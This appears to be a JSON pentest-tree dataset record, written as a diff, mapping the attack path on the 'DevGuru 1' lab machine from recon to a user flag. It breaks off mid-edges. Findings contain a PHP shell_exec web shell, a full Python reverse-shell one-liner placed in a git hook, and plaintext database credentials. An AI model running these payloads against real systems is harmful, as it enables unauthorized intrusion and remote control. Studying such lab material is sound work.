@@ -1,0 +1,1272 @@
+{
+  "machine": "DevGuru 1",
+  "row_index": 8,
+  "legend": {
+    "node_types": {
+      "State (Blue)": "Pentest phase / sub-phase, or informational item (target IP, hostname, machine name, OS, ...)",
+      "Action (Orange)": "A concrete action the pentester performed",
+      "Finding (Green)": "The result/finding produced by an Action"
+    },
+    "status_shading": {
+      "dark": "completed",
+      "mid": "in_progress",
+      "light": "to_do"
+    },
+    "edge_types": {
+      "StateTransition (Black)": "State -> State, advancing through the PTT",
+      "SearchUpdate (Green)": "State -> Action, starting work on a PTT item",
+      "TrackUpdate (Blue)": "Action -> Finding, item execution produced findings",
+      "Prediction (Purple)": "Finding -> State, findings lead back into state"
+    }
+  },
+  "nodes": [
+    {
+      "id": "state:DevGuru 1:r8:START",
+      "label": "State: Start",
+      "type": "State",
+      "color": "#3A86FF",
+      "status": "in_progress",
+      "title": "Start of pentest tree snapshot for 'DevGuru 1' (row 8).",
+      "size": 30,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "state:DevGuru 1:r8:1",
+      "label": "State 1\nNetwork Reconnaissance",
+      "type": "State",
+      "color": "#0B3D91",
+      "status": "completed",
+      "title": "1 Network Reconnaissance [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "action:DevGuru 1:r8:1.1",
+      "label": "Action 1.1\nPort scanning",
+      "type": "Action",
+      "color": "#B33E00",
+      "status": "completed",
+      "title": "1.1 Port scanning [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "finding:DevGuru 1:r8:1.1",
+      "label": "Finding 1.1\nPort 80=HTTP Apache with git …",
+      "type": "Finding",
+      "color": "#06D6A0",
+      "status": null,
+      "title": "Port 80=HTTP Apache with git repository at /.git/; Port 8585=Gitea service with banner I_like_gitea",
+      "size": 32,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "action:DevGuru 1:r8:1.2",
+      "label": "Action 1.2\nService enumeration",
+      "type": "Action",
+      "color": "#B33E00",
+      "status": "completed",
+      "title": "1.2 Service enumeration [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "finding:DevGuru 1:r8:1.2",
+      "label": "Finding 1.2\nGit repository URL=http://dev…",
+      "type": "Finding",
+      "color": "#06D6A0",
+      "status": null,
+      "title": "Git repository URL=http://devguru.local:8585/frank/devguru-website.git",
+      "size": 32,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "state:DevGuru 1:r8:2",
+      "label": "State 2\nInitial Access Preparation",
+      "type": "State",
+      "color": "#0B3D91",
+      "status": "completed",
+      "title": "2 Initial Access Preparation [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "action:DevGuru 1:r8:2.1",
+      "label": "Action 2.1\nConfigure hostname resolution",
+      "type": "Action",
+      "color": "#B33E00",
+      "status": "completed",
+      "title": "2.1 Configure hostname resolution [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "finding:DevGuru 1:r8:2.1",
+      "label": "Finding 2.1\ndevguru.local mapped to 192.1…",
+      "type": "Finding",
+      "color": "#06D6A0",
+      "status": null,
+      "title": "devguru.local mapped to 192.168.1.32 in /etc/hosts",
+      "size": 32,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "action:DevGuru 1:r8:2.2",
+      "label": "Action 2.2\nExtract git repository",
+      "type": "Action",
+      "color": "#B33E00",
+      "status": "completed",
+      "title": "2.2 Extract git repository [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "finding:DevGuru 1:r8:2.2",
+      "label": "Finding 2.2\nRepository contents downloade…",
+      "type": "Finding",
+      "color": "#06D6A0",
+      "status": null,
+      "title": "Repository contents downloaded; all commits extracted; admin.php file discovered; database credentials found in /config/database.php - Database=octoberdb, Username=october, Password=SQ66EBYx4GT3byXH",
+      "size": 32,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "state:DevGuru 1:r8:3",
+      "label": "State 3\nDatabase Access",
+      "type": "State",
+      "color": "#0B3D91",
+      "status": "completed",
+      "title": "3 Database Access [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "action:DevGuru 1:r8:3.1",
+      "label": "Action 3.1\nAccess Adminer interface",
+      "type": "Action",
+      "color": "#B33E00",
+      "status": "completed",
+      "title": "3.1 Access Adminer interface [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "finding:DevGuru 1:r8:3.1",
+      "label": "Finding 3.1\nSuccessfully authenticated to…",
+      "type": "Finding",
+      "color": "#06D6A0",
+      "status": null,
+      "title": "Successfully authenticated to Adminer with october:SQ66EBYx4GT3byXH",
+      "size": 32,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "action:DevGuru 1:r8:3.2",
+      "label": "Action 3.2\nModify user credentials",
+      "type": "Action",
+      "color": "#B33E00",
+      "status": "completed",
+      "title": "3.2 Modify user credentials [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "finding:DevGuru 1:r8:3.2",
+      "label": "Finding 3.2\nFrank's password updated to b…",
+      "type": "Finding",
+      "color": "#06D6A0",
+      "status": null,
+      "title": "Frank's password updated to bcrypt hash for password rajchandel in backend_users table",
+      "size": 32,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "state:DevGuru 1:r8:4",
+      "label": "State 4\nCMS Exploitation",
+      "type": "State",
+      "color": "#0B3D91",
+      "status": "completed",
+      "title": "4 CMS Exploitation [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "action:DevGuru 1:r8:4.1",
+      "label": "Action 4.1\nLogin to October CMS",
+      "type": "Action",
+      "color": "#B33E00",
+      "status": "completed",
+      "title": "4.1 Login to October CMS [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "finding:DevGuru 1:r8:4.1",
+      "label": "Finding 4.1\nSuccessfully authenticated to…",
+      "type": "Finding",
+      "color": "#06D6A0",
+      "status": null,
+      "title": "Successfully authenticated to October CMS with frank:rajchandel",
+      "size": 32,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "action:DevGuru 1:r8:4.2",
+      "label": "Action 4.2\nInject PHP code via CMS conso…",
+      "type": "Action",
+      "color": "#B33E00",
+      "status": "completed",
+      "title": "4.2 Inject PHP code via CMS console [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "finding:DevGuru 1:r8:4.2",
+      "label": "Finding 4.2\nPHP code injected in console …",
+      "type": "Finding",
+      "color": "#06D6A0",
+      "status": null,
+      "title": "PHP code injected in console - function onStart(){$this->page[\"myVar\"]=shell_exec($_GET['cmd']);}; Command execution enabled via cmd parameter; PHP reverse shell uploaded as shell.php via wget; shell accessible at devguru.local/shell.php",
+      "size": 32,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "state:DevGuru 1:r8:5",
+      "label": "State 5\nInitial Shell Access",
+      "type": "State",
+      "color": "#0B3D91",
+      "status": "completed",
+      "title": "5 Initial Shell Access [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "action:DevGuru 1:r8:5.1",
+      "label": "Action 5.1\nTrigger reverse shell",
+      "type": "Action",
+      "color": "#B33E00",
+      "status": "completed",
+      "title": "5.1 Trigger reverse shell [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "finding:DevGuru 1:r8:5.1",
+      "label": "Finding 5.1\nNetcat listener received conn…",
+      "type": "Finding",
+      "color": "#06D6A0",
+      "status": null,
+      "title": "Netcat listener received connection; interactive shell obtained as www-data user",
+      "size": 32,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "state:DevGuru 1:r8:6",
+      "label": "State 6\nCredential Discovery",
+      "type": "State",
+      "color": "#0B3D91",
+      "status": "completed",
+      "title": "6 Credential Discovery [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "action:DevGuru 1:r8:6.1",
+      "label": "Action 6.1\nSearch for backup files",
+      "type": "Action",
+      "color": "#B33E00",
+      "status": "completed",
+      "title": "6.1 Search for backup files [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "finding:DevGuru 1:r8:6.1",
+      "label": "Finding 6.1\nBackup file located at /var/b…",
+      "type": "Finding",
+      "color": "#06D6A0",
+      "status": null,
+      "title": "Backup file located at /var/backup/app.ini.bak",
+      "size": 32,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "action:DevGuru 1:r8:6.2",
+      "label": "Action 6.2\nAccess Gitea database",
+      "type": "Action",
+      "color": "#B33E00",
+      "status": "completed",
+      "title": "6.2 Access Gitea database [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "finding:DevGuru 1:r8:6.2",
+      "label": "Finding 6.2\nGitea database credentials - …",
+      "type": "Finding",
+      "color": "#06D6A0",
+      "status": null,
+      "title": "Gitea database credentials - Username=gitea, Password=UfFPTF8C8jjxVF2m; MySQL connection successful; gitea database accessed",
+      "size": 32,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "state:DevGuru 1:r8:7",
+      "label": "State 7\nGitea Access and Exploitation",
+      "type": "State",
+      "color": "#0B3D91",
+      "status": "completed",
+      "title": "7 Gitea Access and Exploitation [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "action:DevGuru 1:r8:7.1",
+      "label": "Action 7.1\nModify Gitea user credentials",
+      "type": "Action",
+      "color": "#B33E00",
+      "status": "completed",
+      "title": "7.1 Modify Gitea user credentials [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "finding:DevGuru 1:r8:7.1",
+      "label": "Finding 7.1\nFrank's Gitea password update…",
+      "type": "Finding",
+      "color": "#06D6A0",
+      "status": null,
+      "title": "Frank's Gitea password updated to bcrypt hash of rajchandel in user table",
+      "size": 32,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "action:DevGuru 1:r8:7.2",
+      "label": "Action 7.2\nLogin to Gitea and inject git…",
+      "type": "Action",
+      "color": "#B33E00",
+      "status": "completed",
+      "title": "7.2 Login to Gitea and inject git hook [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "finding:DevGuru 1:r8:7.2",
+      "label": "Finding 7.2\nGitea login successful with f…",
+      "type": "Finding",
+      "color": "#06D6A0",
+      "status": null,
+      "title": "Gitea login successful with frank:rajchandel; pre-receive git hook modified with Python reverse shell: python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.1.2\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+      "size": 32,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "state:DevGuru 1:r8:8",
+      "label": "State 8\nPrivilege Escalation to Frank",
+      "type": "State",
+      "color": "#0B3D91",
+      "status": "completed",
+      "title": "8 Privilege Escalation to Frank [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "action:DevGuru 1:r8:8.1",
+      "label": "Action 8.1\nTrigger git hook execution",
+      "type": "Action",
+      "color": "#B33E00",
+      "status": "completed",
+      "title": "8.1 Trigger git hook execution [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "finding:DevGuru 1:r8:8.1",
+      "label": "Finding 8.1\nREADME.md modified and commit…",
+      "type": "Finding",
+      "color": "#06D6A0",
+      "status": null,
+      "title": "README.md modified and committed; pre-receive hook executed; reverse shell connection received as user frank; user.txt flag obtained",
+      "size": 32,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "state:DevGuru 1:r8:9",
+      "label": "State 9\nRoot Privilege Escalation",
+      "type": "State",
+      "color": "#AFC8FF",
+      "status": "to_do",
+      "title": "9 Root Privilege Escalation [to_do]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "state:DevGuru 1:r8:9.1",
+      "label": "State 9.1\nEnumerate sudo privileges",
+      "type": "State",
+      "color": "#AFC8FF",
+      "status": "to_do",
+      "title": "9.1 Enumerate sudo privileges [to_do]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "state:DevGuru 1:r8:9.2",
+      "label": "State 9.2\nExploit vulnerable sudoers co…",
+      "type": "State",
+      "color": "#AFC8FF",
+      "status": "to_do",
+      "title": "9.2 Exploit vulnerable sudoers configuration [to_do]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    }
+  ],
+  "edges": [
+    {
+      "from": "state:DevGuru 1:r8:START",
+      "to": "state:DevGuru 1:r8:1",
+      "label": "1",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:DevGuru 1:r8:1",
+      "to": "action:DevGuru 1:r8:1.1",
+      "label": "1.1 Port scanning",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "action:DevGuru 1:r8:1.1",
+      "to": "finding:DevGuru 1:r8:1.1",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "finding:DevGuru 1:r8:1.1",
+      "to": "state:DevGuru 1:r8:1",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 1,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:DevGuru 1:r8:1",
+      "to": "action:DevGuru 1:r8:1.2",
+      "label": "1.2 Service enumerati…",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "action:DevGuru 1:r8:1.2",
+      "to": "finding:DevGuru 1:r8:1.2",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "finding:DevGuru 1:r8:1.2",
+      "to": "state:DevGuru 1:r8:1",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 1,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:DevGuru 1:r8:1",
+      "to": "state:DevGuru 1:r8:2",
+      "label": "2",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:DevGuru 1:r8:2",
+      "to": "action:DevGuru 1:r8:2.1",
+      "label": "2.1 Configure hostnam…",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "action:DevGuru 1:r8:2.1",
+      "to": "finding:DevGuru 1:r8:2.1",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "finding:DevGuru 1:r8:2.1",
+      "to": "state:DevGuru 1:r8:2",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 1,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:DevGuru 1:r8:2",
+      "to": "action:DevGuru 1:r8:2.2",
+      "label": "2.2 Extract git repos…",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "action:DevGuru 1:r8:2.2",
+      "to": "finding:DevGuru 1:r8:2.2",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "finding:DevGuru 1:r8:2.2",
+      "to": "state:DevGuru 1:r8:2",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 1,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:DevGuru 1:r8:2",
+      "to": "state:DevGuru 1:r8:3",
+      "label": "3",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:DevGuru 1:r8:3",
+      "to": "action:DevGuru 1:r8:3.1",
+      "label": "3.1 Access Adminer in…",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "action:DevGuru 1:r8:3.1",
+      "to": "finding:DevGuru 1:r8:3.1",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "finding:DevGuru 1:r8:3.1",
+      "to": "state:DevGuru 1:r8:3",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 1,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:DevGuru 1:r8:3",
+      "to": "action:DevGuru 1:r8:3.2",
+      "label": "3.2 Modify user crede…",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "action:DevGuru 1:r8:3.2",
+      "to": "finding:DevGuru 1:r8:3.2",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "finding:DevGuru 1:r8:3.2",
+      "to": "state:DevGuru 1:r8:3",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 1,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:DevGuru 1:r8:3",
+      "to": "state:DevGuru 1:r8:4",
+      "label": "4",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:DevGuru 1:r8:4",
+      "to": "action:DevGuru 1:r8:4.1",
+      "label": "4.1 Login to October …",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "action:DevGuru 1:r8:4.1",
+      "to": "finding:DevGuru 1:r8:4.1",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "finding:DevGuru 1:r8:4.1",
+      "to": "state:DevGuru 1:r8:4",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 1,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:DevGuru 1:r8:4",
+      "to": "action:DevGuru 1:r8:4.2",
+      "label": "4.2 Inject PHP code v…",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "action:DevGuru 1:r8:4.2",
+      "to": "finding:DevGuru 1:r8:4.2",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "finding:DevGuru 1:r8:4.2",
+      "to": "state:DevGuru 1:r8:4",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 1,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:DevGuru 1:r8:4",
+      "to": "state:DevGuru 1:r8:5",
+      "label": "5",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:DevGuru 1:r8:5",
+      "to": "action:DevGuru 1:r8:5.1",
+      "label": "5.1 Trigger reverse s…",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "action:DevGuru 1:r8:5.1",
+      "to": "finding:DevGuru 1:r8:5.1",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "finding:DevGuru 1:r8:5.1",
+      "to": "state:DevGuru 1:r8:5",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 1,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:DevGuru 1:r8:5",
+      "to": "state:DevGuru 1:r8:6",
+      "label": "6",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:DevGuru 1:r8:6",
+      "to": "action:DevGuru 1:r8:6.1",
+      "label": "6.1 Search for backup…",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "action:DevGuru 1:r8:6.1",
+      "to": "finding:DevGuru 1:r8:6.1",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "finding:DevGuru 1:r8:6.1",
+      "to": "state:DevGuru 1:r8:6",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 1,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:DevGuru 1:r8:6",
+      "to": "action:DevGuru 1:r8:6.2",
+      "label": "6.2 Access Gitea data…",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "action:DevGuru 1:r8:6.2",
+      "to": "finding:DevGuru 1:r8:6.2",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "finding:DevGuru 1:r8:6.2",
+      "to": "state:DevGuru 1:r8:6",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 1,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:DevGuru 1:r8:6",
+      "to": "state:DevGuru 1:r8:7",
+      "label": "7",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:DevGuru 1:r8:7",
+      "to": "action:DevGuru 1:r8:7.1",
+      "label": "7.1 Modify Gitea user…",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "action:DevGuru 1:r8:7.1",
+      "to": "finding:DevGuru 1:r8:7.1",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "finding:DevGuru 1:r8:7.1",
+      "to": "state:DevGuru 1:r8:7",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 1,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:DevGuru 1:r8:7",
+      "to": "action:DevGuru 1:r8:7.2",
+      "label": "7.2 Login to Gitea an…",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "action:DevGuru 1:r8:7.2",
+      "to": "finding:DevGuru 1:r8:7.2",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "finding:DevGuru 1:r8:7.2",
+      "to": "state:DevGuru 1:r8:7",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 1,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:DevGuru 1:r8:7",
+      "to": "state:DevGuru 1:r8:8",
+      "label": "8",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:DevGuru 1:r8:8",
+      "to": "action:DevGuru 1:r8:8.1",
+      "label": "8.1 Trigger git hook …",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "action:DevGuru 1:r8:8.1",
+      "to": "finding:DevGuru 1:r8:8.1",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
